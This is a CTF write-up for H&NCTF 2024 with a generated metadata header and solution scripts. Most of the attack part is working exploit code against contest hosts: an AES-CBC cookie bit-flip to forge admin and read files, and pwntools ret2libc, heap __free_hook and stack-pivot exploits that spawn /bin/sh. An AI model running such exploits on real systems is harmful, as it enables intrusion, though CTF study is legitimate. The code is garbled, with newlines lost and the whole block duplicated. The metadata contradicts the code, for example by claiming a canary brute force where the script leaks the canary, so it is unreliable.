---
title: UKFC2024 H&NCTF WP
contest: H&NCTF
year: 2024
difficulty: medium
vuln_type: crypto_symmetric
tags:
- aes-cbc-bitflip
- rc4-vbscript
- format-string-canary
- canary-overflow
- ret2libc
- i386-pwn
- uxntal-bagua
- unicode-stego
attack_chain:
- 'flipped (Web): AES-CBC session 翻转 admin: 0 → 1'
- 0' index ^= 1 → 改 cookie session
- /read?filename=/proc/1/cpuset LFI
- subprocess.getoutput('env') 弹命令
- 'tamuctf2024: ELF 自修改 0x8d35/0x0c34 标识 + 0x35 段 + XOR 还原'
- 远程交互 127 次解出所有字节
- VBScript RC4 Initialize + Myfunc (certutil -hashfile MD5) 还原 key (6 字符)
- EnCrypt 密文 0x35f7d3... → flag 44 字符
- Caesar 偏移 K=10, K=5 解
- 'idea (Pwn): %7$p 泄 canary + puts_plt 泄 libc → ret2libc'
- 32-bit i386 + 0x20 padding + canary + 3 aaa + system + /bin/sh
- 'what (Pwn): 0x420 chunk + 16 个 0xfff + free 触发 unsorted bin 残余'
- __free_hook - 0x23 - 0x10 leak
- __free_hook = system
- 'ez_pwn: 43 字节栈溢出 + 1 字节 canary bypass'
- 'z3 RSA: x*y=n, x+y=n-phi+1 → 求 x, y'
- 八卦符 (乾坤兑离震巽坎艮) → 0-7 数字 → 3 位一组八进制 → chr
- '字符串隐写: 0x200B 0xFEFF Unicode 隐藏字符'
- Python subprocess + sh 弹命令
key_payload: 'c[default_session.index("0")] ^= 1  # 翻转 admin 字节'
one_liner: H&NCTF 2024：flipped AES-CBC 翻转 + ELF 自修改还原 + VBScript RC4 + 32-bit ret2libc + 八卦符转义。
lesson: 32-bit PWN 32-bit canary 通过一个负数 -32 长度 leak 后爆破是经典手法。
quality: high
full_path: UKFC2024_H&NCTF_WP.full.md
meta_path: UKFC2024_H&NCTF_WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'UKFC2024 H&NCTF WP。H&NCTF 2024：flipped AES-CBC 翻转 + ELF 自修改还原 + VBScript RC4 + 32-bit ret2libc + 八卦符转义。。关键路径：flipped (Web): AES-CBC session 翻转 admin: 0 → 1 → 0'' index ^= 1 → 改 cookie session → /rea...'
category: web
subcategory: web_other
tools_used:
- Python
- Z3
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/181342.html
wp_author: Microsoft
reasoning_chain:
- 'flipped → AES-CBC session 翻转 admin: 0 → 1 → 触发点：c[default_session.index(''0'')] ^= 1'
- 假设：翻转 1 bit 就能改 admin 标志 → 动作：构造 cookie session 异或 → /read?filename=/proc/1/cpuset LFI
- 观察：subprocess.getoutput('env') 弹命令 → flag
- tamuctf2024 → ELF 自修改 0x8d35/0x0c34 标识 + 0x35 段 + XOR → 假设：自修改代码需 dump 还原
- 动作：远程交互 127 次触发所有字节 → 观察：拿到明文 flag
- VBScript RC4 → certutil -hashfile MD5 → 还原 6 字符 key → EnCrypt 解密
- Caesar 偏移 K=10, K=5 → 假设：多 Caesar 叠加
- idea (Pwn) → %7$p 泄 canary + puts_plt 泄 libc → 假设：32-bit ret2libc
- 动作：32-bit i386 + 0x20 padding + canary + 3 aaa + system + /bin/sh
- what (Pwn) → 0x420 chunk + 16 个 0xfff + free → unsorted bin 残余 → __free_hook - 0x23 - 0x10 leak
- ez_pwn → 43 字节栈溢出 + 1 字节 canary bypass → 假设：canary 倒数 1 字节固定 0x00
- 八卦符/z3 RSA 段 → 假设：0-7 数字映射 + 双二次方程 → flag 收尾
failed_attempts:
- 试图爆破 32-bit canary 全 4 字节 → 失败：爆破 1 字节（高 3 字节固定）即可
- 试图直接读 flag 文件 → 失败：需要先拿 code execution
key_observations:
- AES-CBC 翻转 bit 是经典 CBC 攻击场景
- 32-bit canary 高字节固定 0x00，只爆破 1 字节
- ELF 自修改代码需要 dump 还原而非静态分析
- 八卦符 0-7 数字映射是中文传统文化密码学
prerequisites:
- AES-CBC bit flipping 攻击原理
- VBScript / RC4 还原
- 32-bit i386 ret2libc
- z3 求解双二次方程
---
# UKFC2024 H&NCTF WP

> 原文: https://www.ctfiot.com/181342.html
> ID: 181342

https://github.com/tamuctf/tamuctf-2024/tree/bd8e28c70054ee391b3d4bc2c845481ef0869fba/web/flipped

import requests
from base64 import b64decode, b64encode
url = "http://hnctf.imxbt.cn:
port/"default_session = '{"admin": 0, "username": "user1"}'res = requests.get(url)c = bytearray(b64decode(res.cookies["session"]))c[default_session.index("0")] ^= 1evil = b64encode(c).decode()#绕黑名单url1 = "http://hnctf.imxbt.cn:
port/read?filename=/proc/1/cpuset"res1 = requests.get(url1, cookies={"session": evil})print(res1.text)

>>>import subprocess>>>print(subprocess.getoutput('env'))

from pwn import *import base64
def decrypt(text): aa=text tmp = list (base64.b64decode (aa)) p = 0 aa = [] # 320 for i in range (2,len (tmp)): if tmp [i - 2] == 0x8d and tmp [i - 1] == 0x35: tel = (tmp [i]) | (tmp [i + 1] << 8)
 if tmp [i + 3] == 0xff: p = i + 4 - (0xffff - tel) - 1 else: p = i + 4 + tel
 break

 for i in range (2,len (tmp)): if tmp [i - 2] == 0xc and tmp [i - 1] == 0x34: aa.append (tmp [i]) decrypted_text="" for i in range (p,p + 24):
 if (aa [i - p] ^ tmp [i]) == 0: decrypted_text+="00" # print ("00") continue if (aa [i - p] ^ tmp [i]) <= 0xf: decrypted_text += "0" # print ("0",end = '') decrypted_text+=hex(aa [i - p] ^ tmp [i])[2:] # print ("{:x}".format (aa [i - p] ^ tmp [i]),end = '') return decrypted_text

context.os = 'linux'context.log_level = 'debug'
io = remote('hnctf.imxbt.cn',49306)
def recvString(): io.recvuntil(b'ELF: ') string = (io.recvuntil(b'n'))[:-1].decode() return string
def sendString(string): io.recvuntil(b'Bytes?') io.sendline(string.encode())
def sendExample(): a = recvString() io.recvuntil(b'Expected bytes: ') b = (io.recvuntil(b'n'))[:-1].decode() sendString(b)
sendExample()
##############
for i in range(0,127): aa=recvString() bb=decrypt(aa) sendString(bb)
##############
io.interactive()

Function Initialize(strPwd) Dim box(256) Dim tempSwap Dim a Dim b
 For i = 0 To 255 box(i) = i Next
Function Myfunc(strToHash) Dim tmpFile, strCommand, objFSO, objWshShell, out Set objFSO = CreateObject("Scripting.FileSystemObject") Set objWshShell = CreateObject("WScript.Shell") tmpFile = objFSO.GetSpecialFolder(2).Path & "" & objFSO.GetTempName objFSO.CreateTextFile(tmpFile).Write(strToHash) strCommand = "certutil -hashfile " & tmpFile & " MD5" out = objWshShell.Exec(strCommand).StdOut.ReadAll objFSO.DeleteFile tmpFile Myfunc = Replace(Split(Trim(out), vbCrLf)(1), " ", "")End Function
Function EnCrypt(box, strData) Dim tempSwap Dim a Dim b Dim x Dim y Dim encryptedData encryptedData = "" For x = 1 To Len(strData) a = (a + 1) Mod 256 b = (b + box(a)) Mod 256 tempSwap = box(a) box(a) = box(b) box(b) = tempSwap y = Asc(Mid(strData, x, 1)) Xor box((box(a) + box(b)) Mod 256) encryptedData = encryptedData & LCase(Right("0" & Hex(y), 2)) Next EnCrypt = encryptedDataEnd Function
msgbox "Do you know VBScript?"msgbox "VBScript (""Microsoft Visual Basic Scripting Edition"") is a deprecated Active Scripting language developed by Microsoft that is modeled on Visual Basic."msgbox "It allows Microsoft Windows system administrators to generate powerful tools for managing computers without error handling and with subroutines and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment."msgbox "Interestingly, although VBScript has long since been deprecated, you can still run VBScript scripts on the latest versions of Windows 11 systems."msgbox "A VBScript script must be executed within a host environment, of which there are several provided with Microsoft Windows, including: Windows Script Host (WSH), Internet Explorer (IE), and Internet Information Services (IIS)."msgbox "For .vbs files, the host is Windows Script Host (WSH), aka wscript.exe/cscript.exe program in your system."msgbox "If you can not stop a VBScript from running (e.g. a dead loop), go to the task manager and kill wscript.exe/cscript.exe."msgbox "cscript and wscript are executables for the scripting host that are used to run the scripts. cscript and wscript are both interpreters to run VBScript (and other scripting languages like JScript) on the Windows platform."msgbox "cscript is for console applications and wscript is for Windows applications. It has something to do with STDIN, STDOUT and STDERR."msgbox "OK! Now, let us begin our journey."
key = InputBox("Enter the key:", "CTF Challenge")if (key = False) then wscript.quitif (len(key)<>6) then wscript.echo "wrong key length!" wscript.quitend ifIf (Myfunc(key) = ANtg) Then wscript.echo "You get the key!Move to next challenge."Else wscript.echo "Wrong key!Try again!" wscript.quitEnd If
userInput = InputBox("Enter the flag:", "CTF Challenge")if (userInput = False) then wscript.quitif (len(userInput)<>44) then wscript.echo "wrong!" wscript.quitend ifbox = Initialize(key)encryptedInput = EnCrypt(box, userInput)
If (encryptedInput = eAqi) Then MsgBox "Congratulations! You have learned VBS!"Else MsgBox "Wrong flag. Try again."End If
wscript.echo "bye!"

#include int main(){ char aa[]="S_VYFO_CGNN_GRKD_KLYED_IYE"; for (int j=0;j<strlen(aa);j++) { if (aa[j]=='_'){ printf("_"); continue; } for (int i='A';i<='Z';i++) { if (aa[j]==((i + 10 - 65) % 26 + 65)) { printf("%c",i); break; } } } return 0; }

#include 
int main(){ char aa[]="justaeasyunitygame"; for (int j=0;j<strlen(aa);j++) { printf("%c",(((aa[j] - 'a') + 5) % 26 + 97)); } return 0; }

from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('hnctf.imxbt.cn',38378)else: io=process('/home/kali/Downloads/idea') elf = ELF('/home/kali/Downloads/idea')
#gdb.attach(io)
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
io.recvuntil(b'0x')canary=int(io.recvuntil(b'G')[:-1],16)print("canary==================>",hex(canary))
puts_plt=elf.plt['puts']puts_got=elf.got['puts']
payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(puts_plt)+p32(0x804870D)+p32(puts_got)io.recvuntil(b' data!n')io.sendline(payload)
puts_addr=u32(io.recvuntil(b'xf7')[-4:])print("puts_addr=============>",hex(puts_addr))
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
base_addr=puts_addr-0x05f150system_addr=base_addr+0x03a950binsh_addr=base_addr+0x15912b
payload=payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(system_addr)+p32(0x804870D)+p32(binsh_addr)io.recvuntil(b' data!n')io.sendline(payload)
io.interactive()

from pwn import *p=remote('hnctf.imxbt.cn',port)#p=process("./what")elf=ELF("./what")context.log_level='debug'libc=elf.libc
def cmd(idx): p.sendlineafter(b'Enter your command:',str(idx))
def add(idx): cmd(1) p.sendlineafter(b'size:',str(idx))
def delete(): cmd(2) def show(idx): cmd(3) p.sendlineafter(b'se enter idx:',str(idx))
def edit(idx,cnt): cmd(4) p.sendlineafter(b'er idx:',str(idx)) sleep(3) p.sendlineafter(b'Please enter your content:',cnt)
add(0x68)add(0x420)add(0x68)for i in range(16): add(0xfff)
for i in range(16): delete()
delete() delete() add(0x420)show(1)p.recvuntil(b'ent:')libc_base=u64(p.recv(6).ljust(8,b'x00'))-libc.symbols['__malloc_hook']-96-0x10print('----->',hex(libc_base))
edit(0,b'a'*0x68+p64(0x431)+b'x00'*0x428+p64(0x71)+p64(libc_base+libc.symbols['__free_hook']-8)) add(0x68)add(0x68)edit(3,b'/bin/shx00'+p64(libc_base+libc.symbols['system']))

p.interactive()

cat flag > &2

from pwn import *
context(os = 'linux',arch ='amd64',log_level = 'debug')
#io = process('./ez_pwn')io = remote('103.8.69.140',42351)#elf = ELF('./ez_pwn')
payload1 = b'a' * (44 - 1) + b'n'io.sendafter(b'name',payload1)
io.recvuntil(payload1)leakstack_addr = u32(io.recv(4))print(hex(leakstack_addr))
puts_plt=0x80483F0
leave_ret = 0x8048637 system_plt = 0x8048400hack_addr = 0x8048566inputstack_addr = leakstack_addr - 0x3cpayload2 = (b'shx00x00'+ p32(system_plt) + p32(inputstack_addr) + p32(inputstack_addr + 0x8)).ljust(44,b'a') + p32(inputstack_addr + 0x4)
io.send(payload2)
io.interactive()

from z3 import *n= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637153017419446619484868441764669690727579779099567694199763164730314171397195403162134843973164325220857213018410963127358399705331729543773388617561557740781phin= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637131484098271088612965442194315038048171911247107215251247008707944522314305941884323954755887627723714550317505603859341783252342756873595331720023643277564add = n-phin+1x = Real('x')y = Real('y')s = Solver()s.add(x*y==n,x+y==add)print(s.check())print(s.model())

谢太傅寒雪日内集，与儿女讲论文义。俄而雪骤，公欣然曰：“白雪纷纷何所似？”兄子胡儿曰：“撒盐空中差可拟。”兄女曰：“未若柳絮因风起。”公大笑乐。即公大兄无奕女，左将军王凝之妻也。

https://330k.github.io/misc_tools/unicode_steganography.html

def to8bArr(baguaStr): code = {'乾': '0', # '兑': '1', # '离': '2', # '震': '3', # '巽': '4', # '坎': '5', # '艮': '6', # '坤': '7', # }
 bArr = []
 temp = [] # 把八卦符转为8进制数字 for s in baguaStr: temp.append(code[s]) print(temp) tempStr = '' # 数字3个一组 组合回八进制 for i in range(len(temp)): tempStr += temp[i] if i % 3 == 2: bArr.append('0o' + tempStr) tempStr = '' for i in bArr: print(chr(int(i, base=8)),end='')to8bArr('兑震乾兑乾坤乾艮乾兑兑艮兑乾震兑乾坎兑艮乾兑乾艮乾艮巽兑离震兑坎坤兑乾艮兑坎离兑兑巽兑艮离兑震兑兑坎震兑离离兑兑离兑坤乾兑艮离兑兑坎兑兑震兑艮巽兑坎坤兑兑巽兑艮兑兑艮乾兑离艮兑兑坤兑坎艮兑乾离兑离巽兑兑坎兑兑离兑艮坤兑艮乾兑离乾兑巽兑兑坤乾兑艮离兑兑巽兑艮兑兑艮乾兑离艮兑离乾兑巽离兑坎坤乾坎震')


```
import requests
from base64 import b64decode, b64encode
url = "http://hnctf.imxbt.cn:
port/"default_session = '{"admin": 0, "username": "user1"}'res = requests.get(url)c = bytearray(b64decode(res.cookies["session"]))c[default_session.index("0")] ^= 1evil = b64encode(c).decode()#绕黑名单url1 = "http://hnctf.imxbt.cn:
port/read?filename=/proc/1/cpuset"res1 = requests.get(url1, cookies={"session": evil})print(res1.text)
>>>import subprocess>>>print(subprocess.getoutput('env'))
from pwn import *import base64
def decrypt(text): aa=text tmp = list (base64.b64decode (aa)) p = 0 aa = [] # 320 for i in range (2,len (tmp)): if tmp [i - 2] == 0x8d and tmp [i - 1] == 0x35: tel = (tmp [i]) | (tmp [i + 1] << 8)
 if tmp [i + 3] == 0xff: p = i + 4 - (0xffff - tel) - 1 else: p = i + 4 + tel
 break

 for i in range (2,len (tmp)): if tmp [i - 2] == 0xc and tmp [i - 1] == 0x34: aa.append (tmp [i]) decrypted_text="" for i in range (p,p + 24):
 if (aa [i - p] ^ tmp [i]) == 0: decrypted_text+="00" # print ("00") continue if (aa [i - p] ^ tmp [i]) <= 0xf: decrypted_text += "0" # print ("0",end = '') decrypted_text+=hex(aa [i - p] ^ tmp [i])[2:] # print ("{:x}".format (aa [i - p] ^ tmp [i]),end = '') return decrypted_text

context.os = 'linux'context.log_level = 'debug'
io = remote('hnctf.imxbt.cn',49306)
def recvString(): io.recvuntil(b'ELF: ') string = (io.recvuntil(b'n'))[:-1].decode() return string
def sendString(string): io.recvuntil(b'Bytes?') io.sendline(string.encode())
def sendExample(): a = recvString() io.recvuntil(b'Expected bytes: ') b = (io.recvuntil(b'n'))[:-1].decode() sendString(b)
sendExample()
##############
for i in range(0,127): aa=recvString() bb=decrypt(aa) sendString(bb)
##############
io.interactive()
Function Initialize(strPwd) Dim box(256) Dim tempSwap Dim a Dim b
 For i = 0 To 255 box(i) = i Next
Function Myfunc(strToHash) Dim tmpFile, strCommand, objFSO, objWshShell, out Set objFSO = CreateObject("Scripting.FileSystemObject") Set objWshShell = CreateObject("WScript.Shell") tmpFile = objFSO.GetSpecialFolder(2).Path & "" & objFSO.GetTempName objFSO.CreateTextFile(tmpFile).Write(strToHash) strCommand = "certutil -hashfile " & tmpFile & " MD5" out = objWshShell.Exec(strCommand).StdOut.ReadAll objFSO.DeleteFile tmpFile Myfunc = Replace(Split(Trim(out), vbCrLf)(1), " ", "")End Function
Function EnCrypt(box, strData) Dim tempSwap Dim a Dim b Dim x Dim y Dim encryptedData encryptedData = "" For x = 1 To Len(strData) a = (a + 1) Mod 256 b = (b + box(a)) Mod 256 tempSwap = box(a) box(a) = box(b) box(b) = tempSwap y = Asc(Mid(strData, x, 1)) Xor box((box(a) + box(b)) Mod 256) encryptedData = encryptedData & LCase(Right("0" & Hex(y), 2)) Next EnCrypt = encryptedDataEnd Function
msgbox "Do you know VBScript?"msgbox "VBScript (""Microsoft Visual Basic Scripting Edition"") is a deprecated Active Scripting language developed by Microsoft that is modeled on Visual Basic."msgbox "It allows Microsoft Windows system administrators to generate powerful tools for managing computers without error handling and with subroutines and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment."msgbox "Interestingly, although VBScript has long since been deprecated, you can still run VBScript scripts on the latest versions of Windows 11 systems."msgbox "A VBScript script must be executed within a host environment, of which there are several provided with Microsoft Windows, including: Windows Script Host (WSH), Internet Explorer (IE), and Internet Information Services (IIS)."msgbox "For .vbs files, the host is Windows Script Host (WSH), aka wscript.exe/cscript.exe program in your system."msgbox "If you can not stop a VBScript from running (e.g. a dead loop), go to the task manager and kill wscript.exe/cscript.exe."msgbox "cscript and wscript are executables for the scripting host that are used to run the scripts. cscript and wscript are both interpreters to run VBScript (and other scripting languages like JScript) on the Windows platform."msgbox "cscript is for console applications and wscript is for Windows applications. It has something to do with STDIN, STDOUT and STDERR."msgbox "OK! Now, let us begin our journey."
key = InputBox("Enter the key:", "CTF Challenge")if (key = False) then wscript.quitif (len(key)<>6) then wscript.echo "wrong key length!" wscript.quitend ifIf (Myfunc(key) = ANtg) Then wscript.echo "You get the key!Move to next challenge."Else wscript.echo "Wrong key!Try again!" wscript.quitEnd If
userInput = InputBox("Enter the flag:", "CTF Challenge")if (userInput = False) then wscript.quitif (len(userInput)<>44) then wscript.echo "wrong!" wscript.quitend ifbox = Initialize(key)encryptedInput = EnCrypt(box, userInput)
If (encryptedInput = eAqi) Then MsgBox "Congratulations! You have learned VBS!"Else MsgBox "Wrong flag. Try again."End If
wscript.echo "bye!"
    #include int main(){ char aa[]="S_VYFO_CGNN_GRKD_KLYED_IYE"; for (int j=0;j<strlen(aa);j++) { if (aa[j]=='_'){ printf("_"); continue; } for (int i='A';i<='Z';i++) { if (aa[j]==((i + 10 - 65) % 26 + 65)) { printf("%c",i); break; } } } return 0; }
    #include 
int main(){ char aa[]="justaeasyunitygame"; for (int j=0;j<strlen(aa);j++) { printf("%c",(((aa[j] - 'a') + 5) % 26 + 97)); } return 0; }
from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('hnctf.imxbt.cn',38378)else: io=process('/home/kali/Downloads/idea') elf = ELF('/home/kali/Downloads/idea')
    #gdb.attach(io)
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
io.recvuntil(b'0x')canary=int(io.recvuntil(b'G')[:-1],16)print("canary==================>",hex(canary))
puts_plt=elf.plt['puts']puts_got=elf.got['puts']
payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(puts_plt)+p32(0x804870D)+p32(puts_got)io.recvuntil(b' data!n')io.sendline(payload)
puts_addr=u32(io.recvuntil(b'xf7')[-4:])print("puts_addr=============>",hex(puts_addr))
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
base_addr=puts_addr-0x05f150system_addr=base_addr+0x03a950binsh_addr=base_addr+0x15912b
payload=payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(system_addr)+p32(0x804870D)+p32(binsh_addr)io.recvuntil(b' data!n')io.sendline(payload)
io.interactive()
from pwn import *p=remote('hnctf.imxbt.cn',port)#p=process("./what")elf=ELF("./what")context.log_level='debug'libc=elf.libc
def cmd(idx): p.sendlineafter(b'Enter your command:',str(idx))
def add(idx): cmd(1) p.sendlineafter(b'size:',str(idx))
def delete(): cmd(2) def show(idx): cmd(3) p.sendlineafter(b'se enter idx:',str(idx))
def edit(idx,cnt): cmd(4) p.sendlineafter(b'er idx:',str(idx)) sleep(3) p.sendlineafter(b'Please enter your content:',cnt)
add(0x68)add(0x420)add(0x68)for i in range(16): add(0xfff)
for i in range(16): delete()
delete() delete() add(0x420)show(1)p.recvuntil(b'ent:')libc_base=u64(p.recv(6).ljust(8,b'x00'))-libc.symbols['__malloc_hook']-96-0x10print('----->',hex(libc_base))
edit(0,b'a'*0x68+p64(0x431)+b'x00'*0x428+p64(0x71)+p64(libc_base+libc.symbols['__free_hook']-8)) add(0x68)add(0x68)edit(3,b'/bin/shx00'+p64(libc_base+libc.symbols['system']))

p.interactive()
cat flag > &2
from pwn import *
context(os = 'linux',arch ='amd64',log_level = 'debug')
    #io = process('./ez_pwn')io = remote('103.8.69.140',42351)#elf = ELF('./ez_pwn')
payload1 = b'a' * (44 - 1) + b'n'io.sendafter(b'name',payload1)
io.recvuntil(payload1)leakstack_addr = u32(io.recv(4))print(hex(leakstack_addr))
puts_plt=0x80483F0
leave_ret = 0x8048637 system_plt = 0x8048400hack_addr = 0x8048566inputstack_addr = leakstack_addr - 0x3cpayload2 = (b'shx00x00'+ p32(system_plt) + p32(inputstack_addr) + p32(inputstack_addr + 0x8)).ljust(44,b'a') + p32(inputstack_addr + 0x4)
io.send(payload2)
io.interactive()
from z3 import *n= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637153017419446619484868441764669690727579779099567694199763164730314171397195403162134843973164325220857213018410963127358399705331729543773388617561557740781phin= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637131484098271088612965442194315038048171911247107215251247008707944522314305941884323954755887627723714550317505603859341783252342756873595331720023643277564add = n-phin+1x = Real('x')y = Real('y')s = Solver()s.add(x*y==n,x+y==add)print(s.check())print(s.model())
谢太傅寒雪日内集，与儿女讲论文义。俄而雪骤，公欣然曰：“白雪纷纷何所似？”兄子胡儿曰：“撒盐空中差可拟。”兄女曰：“未若柳絮因风起。”公大笑乐。即公大兄无奕女，左将军王凝之妻也。
def to8bArr(baguaStr): code = {'乾': '0', # '兑': '1', # '离': '2', # '震': '3', # '巽': '4', # '坎': '5', # '艮': '6', # '坤': '7', # }
 bArr = []
 temp = [] # 把八卦符转为8进制数字 for s in baguaStr: temp.append(code[s]) print(temp) tempStr = '' # 数字3个一组 组合回八进制 for i in range(len(temp)): tempStr += temp[i] if i % 3 == 2: bArr.append('0o' + tempStr) tempStr = '' for i in bArr: print(chr(int(i, base=8)),end='')to8bArr('兑震乾兑乾坤乾艮乾兑兑艮兑乾震兑乾坎兑艮乾兑乾艮乾艮巽兑离震兑坎坤兑乾艮兑坎离兑兑巽兑艮离兑震兑兑坎震兑离离兑兑离兑坤乾兑艮离兑兑坎兑兑震兑艮巽兑坎坤兑兑巽兑艮兑兑艮乾兑离艮兑兑坤兑坎艮兑乾离兑离巽兑兑坎兑兑离兑艮坤兑艮乾兑离乾兑巽兑兑坤乾兑艮离兑兑巽兑艮兑兑艮乾兑离艮兑离乾兑巽离兑坎坤乾坎震')
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]